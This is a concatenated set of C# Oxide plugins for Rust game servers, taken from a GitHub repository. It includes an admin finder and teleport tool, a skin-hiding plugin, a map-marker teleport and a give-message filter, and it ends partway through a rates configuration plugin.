            string Name;
            public Vector3 Pos;
            string TypeName;

            public FindData(string TypeName, Vector3 Pos, string Name)
            {
                this.Name = Name;
                this.TypeName = TypeName;
                this.Pos = Pos;
            }

            public override string ToString()
            {
                return string.Format("{0} - {1}{2}", TypeName, Pos.ToString(), Name == string.Empty ? string.Empty : (" - " + Name));
            }

        }

        class PlayerFinder
        {
            string Name;
            string Id;
            bool Online;

            public List<FindData> Data = new List<FindData>();

            public PlayerFinder(string Name, string Id, bool Online)
            {
                this.Name = Name;
                this.Id = Id;
                this.Online = Online;
            }

            public void AddFind(string TypeName, Vector3 Pos, string Name)
            {
                Data.Add(new FindData(TypeName, Pos, Name));
            }

            public override string ToString()
            {
                return string.Format("{0} {1} - {2}", Id, Name, Online ? "Connected" : "Offline");
            }
        }

        PlayerFinder GetPlayerInfo(ulong userID)
        {
            var steamid = userID.ToString();
            var player = covalence.Players.FindPlayer(steamid);
            if(player != null)
            {
                return new PlayerFinder(player.Name, player.Id, player.IsConnected);
            }

            if(PlayerDatabase != null)
            {
                var name = (string)PlayerDatabase?.Call("GetPlayerData", steamid, "name");
                if(name != null)
                {
                    return new PlayerFinder(name, steamid, false);
                }
            }

            return new PlayerFinder("Unknown", steamid, false);
        }

        private object FindPosition(ulong userID)
        {
            var p = BasePlayer.activePlayerList.Find((BasePlayer x) => x.userID == userID);
            if(p == null)
            {
                p = BasePlayer.sleepingPlayerList.Find((BasePlayer x) => x.userID == userID);
                if (p == null)
                    return null;
            }
            return p.transform.position;
        }


        private object FindPlayerID(string arg, BasePlayer source = null)
        {
            ulong userID = 0L;
            if (arg.Length == 17 && ulong.TryParse(arg, out userID))
                return userID;

            var players = covalence.Players.FindPlayers(arg).ToList();
            if(players.Count > 1)
            {
                var returnstring = GetMsg("Multiple players found:\n\r", source);
                foreach(var p in players)
                {
                    returnstring += string.Format("{0} - {1}\n\r", p.Id, p.Name);
                }
                return returnstring;
            }
            if(players.Count == 1)
            {
                return ulong.Parse(players[0].Id);
            }

            if (PlayerDatabase != null)
            {
                string success = PlayerDatabase.Call("FindPlayer", arg) as string;
                if (success.Length == 17 && ulong.TryParse(success, out userID))
                {
                    return userID;
                }
                else
                    return success;
            }

            return GetMsg("No matching players found.", source);
        }

        string Find(BasePlayer player, string[] args)
        {
            string returnstring = string.Empty;

            if(!hasPermission(player, findPermission, findAuthlevel))
            {
                return GetMsg("You don't have the permission to use this command.", player);
            }

            if(args == null || args.Length == 0)
            {
                return GetMsg("ListCommands", player);
            }
            var puserid = player == null ? 0L : player.userID;
            switch(args[0].ToLower())
            {
                case "player":
                case "bag":
                case "cupboard":
                case "building":
                    if(args.Length == 1)
                    {
                        return GetMsg("You need to select a target player.", player);
                    }
                    var f = FindPlayerID(args[1], player);
                    if(!(f is ulong))
                    {
                        return f.ToString();
                    }
                    ulong targetID = (ulong)f;
                    var d = GetPlayerInfo(targetID);
                    returnstring = d.ToString() + ":\n\r";
                    switch (args[0].ToLower())
                    {
                        case "player":
                            var p = FindPosition(targetID);
                            if(p == null)
                            {
                                returnstring += GetMsg("This player doesn't have a position", player);
                            }
                            else 
                                d.AddFind("Position", (Vector3)p, string.Empty);
                            break;
                        case "bag":
                            var bs = SleepingBag.FindForPlayer(targetID, true).ToList();
                            if (bs.Count == 0)
                            {
                                returnstring += GetMsg("This player doesn't have any bags", player);
                            }
                            foreach(var b in bs)
                            {
                                d.AddFind(b.ShortPrefabName, b.transform.position, b.niceName);
                            }
                            break;
                        case "cupboard":
                            var cs = Resources.FindObjectsOfTypeAll<BuildingPrivlidge>().Where(x => x.authorizedPlayers.Any((ProtoBuf.PlayerNameID z) => z.userid == targetID)).ToList();
                            if(cs.Count== 0)
                            {
                                returnstring += GetMsg("This player doesn't have any cupboard privileges", player);
                            }
                            foreach(var c in cs)
                            {
                                d.AddFind("Tool Cupboard", c.transform.position, string.Empty);
                            }
                            break;
                        case "building":
                            var bb = Resources.FindObjectsOfTypeAll<BuildingBlock>().Where(x => x.OwnerID == targetID).ToList();
                            if (bb.Count == 0)
                            {
                                returnstring += GetMsg("This player hasn't built anything yet", player);
                            }
                            var dic = new Dictionary<uint, Dictionary<string, object>>();
                            foreach(var b in bb)
                            {
                                if(!dic.ContainsKey(b.buildingID))
                                {
                                    dic.Add(b.buildingID, new Dictionary<string, object>
                                    {
                                        {"pos", b.transform.position },
                                        {"num", 0 }
                                    });
                                }
                                dic[b.buildingID]["num"] = (int)dic[b.buildingID]["num"] + 1;
                            }
                            foreach (var c in dic)
                            {
                                d.AddFind("Building", (Vector3)c.Value["pos"], c.Value["num"].ToString());
                            }
                            break;
                        default:
                            break;
                    }
                    for (int i = 0; i < d.Data.Count; i++)
                    {
                        returnstring += i.ToString() + " - " + d.Data[i].ToString() + "\n\r";
                    }
                    if (cachedFinder.ContainsKey(puserid))
                    {
                        cachedFinder[puserid].Data.Clear();
                        cachedFinder[puserid] = null;
                        cachedFinder.Remove(puserid);
                    }
                    cachedFinder.Add(puserid, d);
                    break;
                case "item":
                    if(args.Length < 3)
                    {
                        return GetMsg("usage: /find item ITEMNAME MINAMOUNT optional:STEAMID.", player);
                    }
                    var pu = GetPlayerInfo(puserid);
                    var itemname = args[1].ToLower();
                    ulong ownerid = 0L;
                    if (args.Length > 3)
                        ulong.TryParse(args[3], out ownerid);
                    var itemamount = 0;
                    if(!(int.TryParse(args[2], out itemamount)))
                    {
                        return GetMsg("usage: /find item ITEMNAME MINAMOUNT optional:STEAMID.", player);
                    }
                    ItemDefinition item = null;
                    for(int i = 0; i < ItemManager.itemList.Count; i++)
                    {
                        if(ItemManager.itemList[i].displayName.english.ToLower() == itemname)
                        {
                            item = ItemManager.itemList[i];
                            break;
                        }
                    }
                    if(item == null)
                    {
                        return GetMsg("You didn't use a valid item name.", player);
                    }
                    foreach (StorageContainer sc in Resources.FindObjectsOfTypeAll<StorageContainer>())
                    {
                        ItemContainer inventory = sc.inventory;
                        if (inventory == null) continue;
                        List<Item> list = inventory.itemList.FindAll((Item x) => x.info.itemid == item.itemid);
                        int amount = 0;
                        foreach (Item current in list)
                        {
                            if(ownerid == 0L || IsOwned(current, ownerid))
                                amount += current.amount;
                        }
                        if (amount < itemamount) continue;
                        pu.AddFind("Box", sc.transform.position, amount.ToString());
                    }
                    foreach (BasePlayer bp in Resources.FindObjectsOfTypeAll<BasePlayer>())
                    {
                        PlayerInventory inventory = player.inventory;
                        if (inventory == null) continue;
                        int amount = inventory.GetAmount(item.itemid);
                        if (amount < itemamount) continue;
                        Dictionary<string, object> scdata = new Dictionary<string, object>();
                        pu.AddFind(string.Format("{0} {1}", player.userID.ToString(), player.displayName), bp.transform.position, amount.ToString());
                    }
                    for (int i = 0; i < pu.Data.Count; i++)
                    {
                        returnstring += i.ToString() + " - " + pu.Data[i].ToString() + "\n\r";
                    }
                    if (cachedFinder.ContainsKey(puserid))
                    {
                        cachedFinder[puserid].Data.Clear();
                        cachedFinder[puserid] = null;
                        cachedFinder.Remove(puserid);
                    }
                    cachedFinder.Add(puserid, pu);
                    break;
                case "tp":
                    if(player == null)
                    {
                        return GetMsg("You are using the console, you can't tp!", player);
                    }
                    if (!cachedFinder.ContainsKey(puserid))
                    {
                        return GetMsg("You didn't find anything yet", player);
                    }
                    if (args.Length == 1)
                    {
                        return GetMsg("You need to select a target findid.", player);
                    }
                    var fp = cachedFinder[puserid];
                    var id = 0;
                    int.TryParse(args[1], out id);
                    if(id >= fp.Data.Count)
                    {
                        return GetMsg("This id is out of range.", player);
                    }

                    var data = cachedFinder[puserid].Data[id];
                    player.MovePosition(data.Pos);
                    player.ClientRPCPlayer(null, player, "ForcePositionTo", data.Pos);
                    returnstring += data.ToString();
                    break;
                default:
                    returnstring += GetMsg("ListCommands", player);
                    break;
            }
           


            return returnstring;
        }

        bool IsOwned(Item item, ulong userid)
        {
            var owner = item.owners.Where(x => x.userid == userid).ToList();
            if (owner == null || owner.Count == 0) return false;
            return true;
        }

        [ChatCommand("find")]
        void cmdChatFind(BasePlayer player, string command, string[] args)
        {
            SendReply(player, Find(player, args));
        }

        [ConsoleCommand("finder.find")]
        void cmdConsoleFind(ConsoleSystem.Arg arg)
        {
            var player = arg.Player();
            arg.ReplyWith(Find(player, arg.Args));
        }
    }
}


// --- End of file: Finder.cs ---
// --- Next file ---

// --- GitHub Source URL: https://github.com/RustyyTown/plugins/blob/main/NoSkins-1.0.1.cs ---
// --- Original Local Path: NoSkins-1.0.1.cs ---

﻿using System.Collections;
using System.Collections.Generic;
using Facepunch;
using ProtoBuf;
using Network;
using Oxide.Core.Libraries.Covalence;
using System.Linq;
using HarmonyLib;
using Oxide.Core.Plugins;
using Newtonsoft.Json;
using UnityEngine;
using System.IO;
using Oxide.Core;

namespace Oxide.Plugins
{
    [Info("NoSkins", "Whispers88", "1.0.1")]
    [Description("Allows you to disable other players worn skins")]
    public class NoSkins : RustPlugin
    {
        //public static NoSkins _noSkins;
        private static HashSet<ulong> _HideSkinsPlayers = new HashSet<ulong>();
        private const string PermAllow = "noskins.allow";
        private const string PermHideSkins = "noskins.on";

        #region Config
        private Configuration config;
        class Configuration
        {
            [JsonProperty("Command Aliases")]
            public string[] noskinCMD = new[] { "noskin", "noskins", "ns" };

            public string ToJson() => JsonConvert.SerializeObject(this);

            public Dictionary<string, object> ToDictionary() => JsonConvert.DeserializeObject<Dictionary<string, object>>(ToJson());
        }

        protected override void LoadDefaultConfig() => config = new Configuration();
        protected override void LoadConfig()
        {
            base.LoadConfig();
            try
            {
                config = Config.ReadObject<Configuration>();
                if (config == null)
                {
                    throw new JsonException();
                }
                var configDict = config.ToDictionary();
                Dictionary<string, object> defaultconObjects = new Dictionary<string, object>();
                foreach (var obj in Config)
                {
                    defaultconObjects.Add(obj.Key, obj.Value);
                }
                if (configDict.Count != defaultconObjects.Count)
                {
                    Puts("Configuration appears to be outdated; updating and saving");
                    SaveConfig();
                }
                else
                {
                    foreach (var key in configDict.Keys)
                    {
                        if (defaultconObjects.ContainsKey(key))
                            continue;

                        Puts("Configuration appears to be outdated; updating and saving");
                        SaveConfig();
                        break;

                    }
                }
            }
            catch
            {
                Puts($"Configuration file {Name}.json is invalid; using defaults");
                LoadDefaultConfig();
            }
        }

        protected override void SaveConfig()
        {
            Puts($"Configuration changes saved to {Name}.json");
            Config.WriteObject(config, true);
        }

        #endregion Config

        #region Initialization
        private void Init()
        {
            //_noSkins = this;
            _cachedContainers = new Dictionary<ulong, ProtoBuf.ItemContainer>();
            _HideSkinsPlayers = new HashSet<ulong>();

            permission.RegisterPermission(PermAllow, this);
            permission.RegisterPermission(PermHideSkins, this);

            AddCovalenceCommand(config.noskinCMD, nameof(NoSkinCMD));

            foreach (var player in BasePlayer.activePlayerList)
            {
                OnPlayerConnected(player);
            }
        }

        private void Unload()
        {
            foreach (var player in BasePlayer.activePlayerList)
            {
                if (_HideSkinsPlayers.Contains(player.userID))
                    permission.GrantUserPermission(player.UserIDString, PermHideSkins, this);
            }
            _HideSkinsPlayers = null;
            _cachedContainers = null;
            //_noSkins = null;
        }

        #endregion Initialization

        #region Commands
        private void NoSkinCMD(IPlayer iplayer, string command, string[] args)
        {
            BasePlayer player = (BasePlayer)iplayer.Object;
            if (player == null) return;

            if (!HasPerm(player.UserIDString, PermAllow))
            {
                Message(player, "NoPerms");
                return;
            }

            if (_HideSkinsPlayers.Contains(player.userID))
            {
                _HideSkinsPlayers.Remove(player.userID);
                //permission.RevokeUserPermission(player.UserIDString, PermHideSkins);

                UpdateCurrentConnections(player, false);
                Message(player, "SkinsEnabled");
                return;
            }

            //permission.GrantUserPermission(player.UserIDString, PermHideSkins, this);
            _HideSkinsPlayers.Add(player.userID);

            UpdateCurrentConnections(player, true);
            Message(player, "SkinsDisabled");
        }
        #endregion Commands

        #region Localization
        protected override void LoadDefaultMessages()
        {
            lang.RegisterMessages(new Dictionary<string, string>
            {
                ["SkinsDisabled"] = "Skins: <color=orange> Disabled </color>",
                ["SkinsEnabled"] = "Skins: <color=orange> Enabled </color>",
                ["NoPerms"] = "You do not have permission to do this"
            }, this);
        }

        private string GetLang(string langKey, string playerId) => lang.GetMessage(langKey, this, playerId);

        private void Message(BasePlayer player, string langKey)
        {
            if (player.IsConnected) player.ChatMessage(GetLang(langKey, player.UserIDString));
        }

        #endregion Localization

        #region Hooks
        private void OnPlayerConnected(BasePlayer player)
        {
            if (HasPerm(player.UserIDString, PermHideSkins) && HasPerm(player.UserIDString, PermAllow))
            {
                ServerMgr.Instance.Invoke(() =>
                {
                    _HideSkinsPlayers.Add(player.userID);
                    UpdateCurrentConnections(player, true);
                }, 3f);
            }
        }

        private void OnPlayerDisconnected(BasePlayer player, string reason)
        {
            if (_HideSkinsPlayers.Contains(player.userID))
                permission.GrantUserPermission(player.UserIDString, PermHideSkins, this);
            else
                permission.RevokeUserPermission(player.UserIDString, PermHideSkins);

            _HideSkinsPlayers.Remove(player.userID);
        }

        private object? OnInventoryNetworkUpdate(PlayerInventory instance, ItemContainer container, UpdateItemContainer updateItemContainer, PlayerInventory.Type type, PlayerInventory.NetworkInventoryMode mode)
        {
            if (instance._baseEntity?.IsNpc ?? true)
                return null;

            if (type != PlayerInventory.Type.Wear)
            {
                return null;
            }
            if (mode == PlayerInventory.NetworkInventoryMode.LocalPlayer)
            {
                return null;
            }
            if (mode == PlayerInventory.NetworkInventoryMode.EveryoneButLocal)
            {
                SendUpdates(instance, updateItemContainer, true);
                return false;
            }
            if (mode == PlayerInventory.NetworkInventoryMode.Everyone)
            {
                SendUpdates(instance, updateItemContainer, false);
                return false;
            }
            return null;
        }
        #endregion Hooks

        #region Methods
        private void UpdateCurrentConnections(BasePlayer player, bool disableSkins)
        {
            var subscribers = player.net.@group.subscribers;
            foreach (var connection in subscribers)
            {
                if (connection?.player is BasePlayer current)
                {
                    if (current.userID == player.userID)
                        continue;

                    CreateAndSendUpdateItemContainer(player, current, current.inventory.containerWear, PlayerInventory.Type.Wear, disableSkins);
                }
            }
        }

        private static Dictionary<ulong, ProtoBuf.ItemContainer> _cachedContainers = new Dictionary<ulong, ProtoBuf.ItemContainer>();

        private static void CreateAndSendUpdateItemContainer(BasePlayer player, BasePlayer current, ItemContainer container, PlayerInventory.Type type, bool disableSkins)
        {
            if (container == null)
                return;

            using (var updateItemContainer = Pool.Get<UpdateItemContainer>())
            {
                container.dirty = false;

                updateItemContainer.type = (int)type;
                updateItemContainer.container = Pool.Get<List<ProtoBuf.ItemContainer>>();

                if (!_cachedContainers.TryGetValue(current.userID, out ProtoBuf.ItemContainer? savedContainer) || savedContainer?.contents == null || savedContainer.contents.Count != current.inventory.containerWear.itemList.Count)
                {
                    savedContainer = container.Save(true);
                    _cachedContainers[current.userID] = savedContainer;
                }
                if (disableSkins && savedContainer.contents != null)
                {
                    foreach (var item in savedContainer.contents)
                    {
                        item.skinid = 0;
                    }
                }
                updateItemContainer.container.Add(savedContainer);

                current.ClientRPC<UpdateItemContainer>(RpcTarget.Player("UpdatedItemContainer", player), updateItemContainer);
            }
        }

        private void SendUpdates(PlayerInventory playerInventory, UpdateItemContainer updateItemContainer, bool updateLocal)
        {
            BasePlayer basePlayer = playerInventory._baseEntity;
            if (basePlayer?.net?.group == null)
                return;

            _cachedContainers[basePlayer.userID] = updateItemContainer.container[0];

            var subscribers = basePlayer.net.group.subscribers;

            List<Connection> connectionsSkinned = Pool.Get<List<Connection>>();
            List<Connection> connectionsNoSkin = Pool.Get<List<Connection>>();

            foreach (var connection in subscribers)
            {
                if (connection?.player is BasePlayer current)
                {
                    if (updateLocal && current.userID == basePlayer.userID)
                    {
                        continue;
                    }

                    if (_HideSkinsPlayers.Contains(current.userID))
                    {
                        connectionsNoSkin.Add(connection);
                    }
                    else
                    {
                        connectionsSkinned.Add(connection);
                    }
                }
            }

            if (connectionsSkinned.Count > 0)
            {
                basePlayer.ClientRPC<UpdateItemContainer>(RpcTarget.Players("UpdatedItemContainer", connectionsSkinned), updateItemContainer);
            }

            if (connectionsNoSkin.Count > 0)
            {
                foreach (var con in updateItemContainer.container)
                {
                    foreach (var item in con.contents)
                    {
                        item.skinid = 0;
                    }
                }
                basePlayer.ClientRPC<UpdateItemContainer>(RpcTarget.Players("UpdatedItemContainer", connectionsNoSkin), updateItemContainer);
            }

            Pool.FreeUnmanaged(ref connectionsSkinned);
            Pool.FreeUnmanaged(ref connectionsNoSkin);
        }

        #endregion Methods

        #region Harmony
        [HarmonyPatch(typeof(PlayerCorpse), "Save"), AutoPatch]
        private static class PlayerCorpse_Save_Patch
        {
            [HarmonyPostfix]
            private static void Postfix(PlayerCorpse __instance, BaseNetworkable.SaveInfo info)
            {
                if (info.forConnection == null)
                    return;

                if (!_HideSkinsPlayers.Contains(info.forConnection.userid))
                    return;

                if (info.msg.storageBox == null)
                    return;

                foreach (var item in info.msg.storageBox.contents.contents)
                {
                    item.skinid = 0;
                }
            }
        }

        [HarmonyPatch(typeof(BaseNetworkable), "SendNetworkGroupChange"), AutoPatch] // when a player respawns
        private static class BaseNetworkable_SendNetworkGroupChange_Patch
        {
            [HarmonyPostfix]
            private static void Postfix(BaseNetworkable __instance)
            {
                if (__instance.net.connection == null)
                    return;

                if (__instance.net.connection.player is not BasePlayer basePlayer)
                    return;

                bool hidingSkins = _HideSkinsPlayers.Contains(__instance.net.connection.userid);

                foreach (var subscriber in basePlayer.net.group.subscribers)
                {
                    if (subscriber.userid == __instance.net.connection.userid)
                        continue;

                    if (subscriber.player is not BasePlayer subPlayer || subPlayer.IsNpc)
                        continue;

                    bool hidingSkins2 = _HideSkinsPlayers.Contains(subscriber.userid);

                    if (hidingSkins2)
                    {
                        CreateAndSendUpdateItemContainer(subPlayer, basePlayer, basePlayer.inventory.containerWear, PlayerInventory.Type.Wear, true);
                    }

                    if (hidingSkins)
                    {
                        CreateAndSendUpdateItemContainer(basePlayer, subPlayer, subPlayer.inventory.containerWear, PlayerInventory.Type.Wear, true);
                    }
                }
            }
        }

        [HarmonyPatch(typeof(Networkable), "OnGroupTransition"), AutoPatch] //moving between grids
        private static class BaseNetworkable_OnGroupTransition_Patch
        {
            [HarmonyPostfix]
            private static void Postfix(Networkable __instance, Network.Visibility.Group oldGroup)
            {
                if (__instance.connection == null)
                    return;

                if (__instance.connection.player is not BasePlayer basePlayer)
                    return;

                bool hidingSkins = _HideSkinsPlayers.Contains(__instance.connection.userid);

                foreach (var subscriber in basePlayer.net.group.subscribers)
                {
                    if (subscriber.userid == __instance.connection.userid)
                        continue;

                    if (subscriber.player is not BasePlayer subPlayer || subPlayer.IsNpc)
                        continue;

                    bool hidingSkins2 = _HideSkinsPlayers.Contains(subscriber.userid);

                    if (hidingSkins2)
                    {
                        CreateAndSendUpdateItemContainer(subPlayer, basePlayer, basePlayer.inventory.containerWear, PlayerInventory.Type.Wear, true);
                    }

                    if (hidingSkins)
                    {
                        CreateAndSendUpdateItemContainer(basePlayer, subPlayer, subPlayer.inventory.containerWear, PlayerInventory.Type.Wear, true);
                    }
                }
            }
        }
        #endregion Harmony

        #region Helpers

        private bool HasPerm(string id, string perm) => permission.UserHasPermission(id, perm);

        private void AddLocalizedCommand(string command)
        {
            foreach (string language in lang.GetLanguages(this))
            {
                Dictionary<string, string> messages = lang.GetMessages(language, this);
                foreach (KeyValuePair<string, string> message in messages)
                {
                    if (!message.Key.Equals(command)) continue;

                    if (string.IsNullOrEmpty(message.Value)) continue;

                    AddCovalenceCommand(message.Value, command);
                }
            }
        }
        #endregion Helpers
    }
}

// --- End of file: NoSkins-1.0.1.cs ---
// --- Next file ---

// --- GitHub Source URL: https://github.com/RustyyTown/plugins/blob/main/TeleportMarker.cs ---
// --- Original Local Path: TeleportMarker.cs ---

using System;
using System.Collections.Generic;
using Newtonsoft.Json;
using ProtoBuf;
using UnityEngine;

namespace Oxide.Plugins
{
    [Info("Teleport Marker", "Talha", "1.0.5")]
    [Description("Authorized players can teleport to map markers with that plugin.")]
    public class TeleportMarker : RustPlugin
    {
		private const string permUse = "teleportmarker.use";
        private ConfigData config;
        private class ConfigData
        {
            [JsonProperty(PropertyName = "Admins can teleport without permission")]
            public bool admins;
        }

        private ConfigData GetDefaultConfig()
        {
            return new ConfigData
            {
                admins = true,
            };
        }
        protected override void LoadConfig()
        {
            base.LoadConfig();
            try
            {
                config = Config.ReadObject<ConfigData>();

                if (config == null)
                {
                    LoadDefaultConfig();
                }
            }
            catch
            {
                PrintError("Configuration file is corrupt.");
                return;
            }
            SaveConfig();
        }
        protected override void LoadDefaultConfig()
        {
            config = GetDefaultConfig();
        }
        protected override void SaveConfig()
        {
            Config.WriteObject(config);
        }
        private void Message(BasePlayer player, string key, params object[] args)
        {
            var message = string.Format(lang.GetMessage(key, this, player.UserIDString), args);
            player.ChatMessage(message);
        }
        private void Unload()
        {
            foreach (var user in BasePlayer.activePlayerList)
            {
                user.SendConsoleCommand("gametip.hidegametip");
            }
        }
        private void OnServerInitialized()
        {
            foreach (var user in BasePlayer.activePlayerList)
            {
                user.SendConsoleCommand("gametip.hidegametip");
            }
            permission.RegisterPermission(permUse, this);
        }
        protected override void LoadDefaultMessages()
        {
            lang.RegisterMessages(new Dictionary<string, string>
            {
                ["Teleported"] = "You are teleported to <color=#FFA600>{0}</color>.",
                ["Cooldown"] = "Your health has been set to {0}, you can teleport again."
            }, this);
            lang.RegisterMessages(new Dictionary<string, string>
            {
                ["Teleported"] = "<color=#FFA600>{0}</color> konumuna ışınlandınız.",
                ["Cooldown"] = "Canın eskisi gibi <color=#FFA600>{0}</color> olarak ayarlandı, yeniden ışınlanabilirsiniz."
            }, this, "tr");
        }
        private void TP(BasePlayer player, MapNote note)
        {
            player.flyhackPauseTime = 10f;
            var health = player.health;
            var health2 = 100 - health;
            player._health = 100;
            var pos = note.worldPosition + new Vector3(0,20,0);;
            player.Teleport(pos);
            Message(player, "Teleported", pos);
            timer.Once(6f, () => { if (player == null) return; Message(player, "Cooldown", (100 - health2)); player.SetMaxHealth(100); player.Hurt(health2); });
        }
        private void OnMapMarkerAdded(BasePlayer player, MapNote note)
        {
            if (player == null || note == null) return;
            if (config.admins == true)
            {
                if (!player.IsAdmin && !player.IPlayer.HasPermission(permUse)) return;
                TP(player, note);
            }
            else
            {
                if (!player.IPlayer.HasPermission(permUse)) return;
                TP(player, note);
            }
        }
    }
}

// --- End of file: TeleportMarker.cs ---
// --- Next file ---

// --- GitHub Source URL: https://github.com/RustyyTown/plugins/blob/main/GiveServerMsg.cs ---
// --- Original Local Path: GiveServerMsg.cs ---

namespace Oxide.Plugins
{
    [Info("GiveServerMsg", "EcoSmile", "1.0.0", ResourceId = 2336)]
    [Description("Hide server give message")]

    class GiveServerMsg : RustPlugin
    {
        object OnServerMessage(string m, string n) => m.Contains("gave") && n == "SERVER" ? (object)true : null;
    }
}


// --- End of file: GiveServerMsg.cs ---
// --- Next file ---

// --- GitHub Source URL: https://github.com/RustyyTown/plugins/blob/main/IQRates.cs ---
// --- Original Local Path: IQRates.cs ---

using Newtonsoft.Json;
using Oxide.Core.Plugins;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using UnityEngine;

namespace Oxide.Plugins
{
    [Info("IQRates", "SkuliDropek", "1.3.67")]
    [Description("Настройка рейтинга на сервере")]
    class IQRates : RustPlugin
    {
        /// <summary>

        /// Обновление 1.3.x
        /// - Исправил удаление чинука на оилриге после активации ящика
        /// - Изменил методы удаления ивентов
        /// - Сделал печки более чувствителньыми к рейтам
        /// - Теперь можно настраивать уровень потребляемого топлива в печах
        /// - Добавил реагирование добычи экскаватора на рейтинг игрока по привилегии
        /// - Добавлен черный список предметов для печек

        [PluginReference] Plugin IQChat;
        public void SendChat(String Message, BasePlayer player, ConVar.Chat.ChatChannel channel = ConVar.Chat.ChatChannel.Global)
        {
            if (IQChat)
                if (config.pluginSettings.ReferenceSettings.IQChatSetting.UIAlertUse)
                    IQChat?.Call("API_ALERT_PLAYER_UI", player, Message);
                else IQChat?.Call("API_ALERT_PLAYER", player, Message, config.pluginSettings.ReferenceSettings.IQChatSetting.CustomPrefix, config.pluginSettings.ReferenceSettings.IQChatSetting.CustomAvatar);
            else player.SendConsoleCommand("chat.add", channel, 0, Message);
        }


        private const Boolean LanguageEn = false;

        #region Vars
        private MonumentInfo SpacePort;
        public List<UInt64> LootersListCrateID = new List<UInt64>();
        public static IQRates _;
        public enum SkipType
        {
            Day,
            Night
        }
        #endregion

        #region Configuration

        private static Configuration config = new Configuration();
        private class Configuration
        {
            [JsonProperty(LanguageEn ? "Plugin setup" : "Настройка плагина")]
            public PluginSettings pluginSettings = new PluginSettings();

            internal class PluginSettings
            {
                [JsonProperty(LanguageEn ? "Rating settings" : "Настройка рейтингов")]
                public Rates RateSetting = new Rates();
                [JsonProperty(LanguageEn ? "Additional plugin settings" : "Дополнительная настройка плагина")]
                public OtherSettings OtherSetting = new OtherSettings();     
                [JsonProperty(LanguageEn ? "Configuring supported plugins" : "Настройка поддерживаемых плагинов")]
                public ReferencePlugin ReferenceSettings = new ReferencePlugin();

                internal class ReferencePlugin
                {
                    [JsonProperty(LanguageEn ? "Setting up IQChat" : "Настройка IQChat")]
                    public IQChatReference IQChatSetting = new IQChatReference();
                    internal class IQChatReference
                    {
                        [JsonProperty(LanguageEn ? "IQChat : Custom prefix in chat" : "IQChat : Кастомный префикс в чате")]
                        public String CustomPrefix = "[IQRates]";
                        [JsonProperty(LanguageEn ? "IQChat : Custom chat avatar (If required)" : "IQChat : Кастомный аватар в чате(Если требуется)")]
                        public String CustomAvatar = "0";
                        [JsonProperty(LanguageEn ? "IQChat : Use UI Notifications" : "IQChat : Использовать UI уведомления")]
                        public Boolean UIAlertUse = false;
                    }
                }

                internal class Rates
                {
                    [JsonProperty(LanguageEn ? "Ranking setting during the day" : "Настройка рейтинга днем")]
                    public AllRates DayRates = new AllRates();
                    [JsonProperty(LanguageEn ? "Setting the rating at night" : "Настройка рейтинга ночью")]
                    public AllRates NightRates = new AllRates();
                    [JsonProperty(LanguageEn ? "Setting privileges and ratings specifically for them [iqrates.vip] = { Setting } (Descending)" : "Настройка привилегий и рейтингов конкретно для них [iqrates.vip] = { Настройка } (По убыванию)")]
                    public Dictionary<String, DayAnNightRate> PrivilegyRates = new Dictionary<String, DayAnNightRate>();

                    [JsonProperty(LanguageEn ? "Setting custom rates (items) by permission - setting (Descending)" : "Настройка кастомных рейтов(предметов) по пермишенсу - настройка (По убыванию)")]
                    public PermissionsRate CustomRatesPermissions = new PermissionsRate();

                    [JsonProperty(LanguageEn ? "Black list of items that will not be categorically affected by the rating" : "Черный лист предметов,на которые катигорично не будут действовать рейтинг")]
                    public List<String> BlackList = new List<String>();
                    [JsonProperty(LanguageEn ? "Enable melting speed in furnaces (true - yes/false - no)" : "Включить скорость плавки в печах(true - да/false - нет)")]
                    public Boolean UseSpeedBurnable;
                    [JsonProperty(LanguageEn ? "A black list of items for the stove, which will not be categorically affected by melting" : "Черный лист предметов для печки,на которые катигорично не будут действовать плавка")]
                    public List<String> BlackListBurnable = new List<String>();
                    [JsonProperty(LanguageEn ? "Furnace smelting speed (If the list is enabled, this value will be the default for everyone who does not have rights)" : "Скорость плавки печей(Если включен список - это значение будет стандартное для всех у кого нет прав)")]
                    public Single SpeedBurnable;
                    [JsonProperty(LanguageEn ? "Smelting Fuel Usage Rating (If the list is enabled, this value will be t